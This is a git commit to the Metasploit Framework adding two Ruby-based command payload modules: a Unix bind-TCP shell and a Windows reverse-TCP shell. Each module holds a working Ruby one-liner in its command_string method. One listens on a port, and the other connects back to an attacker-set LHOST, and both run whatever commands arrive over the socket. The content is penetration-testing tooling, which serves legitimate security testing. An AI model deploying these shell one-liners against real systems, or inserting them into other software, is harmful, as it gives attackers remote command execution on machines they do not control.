4ae6d81616980717c113bc75bdbeb822d098a93d
kris <>
2008-11-20 03:42:55 +0000

    Add bind_ruby and reverse_ruby cmd payloads for unix and windows
    git-svn-id: file:///home/svn/framework3/trunk@5967 4d416f70-5f16-0410-b530-b9f4589650da

---
+++ modules/payloads/singles/cmd/unix/bind_ruby.rb
@@ -0,0 +1,43 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/
+##
+
+require 'msf/core'
+require 'msf/core/handler/bind_tcp'
+require 'msf/base/sessions/command_shell'
+
+module Metasploit3
+
+	include Msf::Payload::Single
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'        => 'Unix Command Shell, Bind TCP (via Ruby)',
+			'Version'     => '$Revision$',
+			'Description' => 'Continually listen for a connection and spawn a command shell via Ruby',
+			'Author'      => 'Kris Katterjohn <katterjohn[at]gmail.com>',
+			'License'     => MSF_LICENSE,
+			'Platform'    => 'unix',
+			'Arch'        => ARCH_CMD,
+			'Handler'     => Msf::Handler::BindTcp,
+			'Session'     => Msf::Sessions::CommandShell,
+			'PayloadType' => 'cmd',
+			'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
+		))
+	end
+
+	def generate
+		return super + command_string
+	end
+
+	def command_string
+		"ruby -rsocket -e 'exit if fork;s=TCPServer.new(\"#{datastore['LPORT']}\");while(c=s.accept);while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end;end'"
+	end
+end
---
+++ modules/payloads/singles/cmd/windows/reverse_ruby.rb
@@ -0,0 +1,43 @@
+##
+# $Id$
+##
+
+##
+# This file is part of the Metasploit Framework and may be subject to 
+# redistribution and commercial restrictions. Please see the Metasploit
+# Framework web site for more information on licensing and terms of use.
+# http://metasploit.com/projects/Framework/
+##
+
+require 'msf/core'
+require 'msf/core/handler/reverse_tcp'
+require 'msf/base/sessions/command_shell'
+
+module Metasploit3
+
+	include Msf::Payload::Single
+
+	def initialize(info = {})
+		super(merge_info(info,
+			'Name'        => 'Windows Command Shell, Reverse TCP (via Ruby)',
+			'Version'     => '$Revision$',
+			'Description' => 'Connect back and create a command shell via Ruby',
+			'Author'      => 'Kris Katterjohn <katterjohn[at]gmail.com>',
+			'License'     => MSF_LICENSE,
+			'Platform'    => 'win',
+			'Arch'        => ARCH_CMD,
+			'Handler'     => Msf::Handler::ReverseTcp,
+			'Session'     => Msf::Sessions::CommandShell,
+			'PayloadType' => 'cmd',
+			'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
+		))
+	end
+
+	def generate
+		return super + command_string
+	end
+
+	def command_string
+		"ruby -rsocket -e 'c=TCPSocket.new(\"#{datastore['LHOST']}\",\"#{datastore['LPORT']}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
+	end
+end
